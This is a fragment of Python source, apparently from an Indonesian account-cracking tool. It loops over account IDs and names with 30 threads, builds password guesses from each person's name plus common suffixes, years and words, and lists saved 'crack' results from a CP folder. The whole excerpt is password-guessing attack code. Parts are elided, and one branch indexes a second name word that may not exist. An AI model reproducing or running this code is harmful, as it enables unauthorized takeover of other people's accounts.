			...
			with ThreadPoolExecutor(max_workers=30) as TitidNeverDie:
				for akun in self.id: 
					try:
						...
						na = name.split(' ')
						if len(na) == 1:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345", na[0]+"1234", na[0]+"123456", na[0]+"1234567", na[0]+"12345678", na[0]+"2000", na[0]+"2001", na[0]+"2002", na[0]+"1999"]
						elif len(na) == 2:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345", na[0]+"1234", na[0]+"123456", na[0]+"1234567", na[0]+"12345678", na[0]+"2000", na[0]+"2001", na[0]+"2002", na[0]+"1999"]
						elif len(na) == 3:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345", na[0]+"1234", na[0]+"123456", na[0]+"1234567", na[0]+"12345678", na[0]+"2000", na[0]+"2001", na[0]+"2002", na[0]+"1999"]
			...
			with ThreadPoolExecutor(max_workers=30) as TitidNeverDie:
				for akun in self.id: 
					try:
						uid, name = akun.split('<=>')
						ss = name.split(' ')
						pwx = [ name, ss[0]+ss[1], ss[0]+"123", ss[0]+"12345", ss[0]+"1234", "sayang", "kontol", "anjing", "123456", "1234", "11223344",]
...
def file_cp():
	dirs = os.listdir('CP')
	print ("\n%s•%s [%s selecet hasil crack yg tersimpan untuk cek opsi %s]\n"%(U,O,U,O))
	for file in dirs:
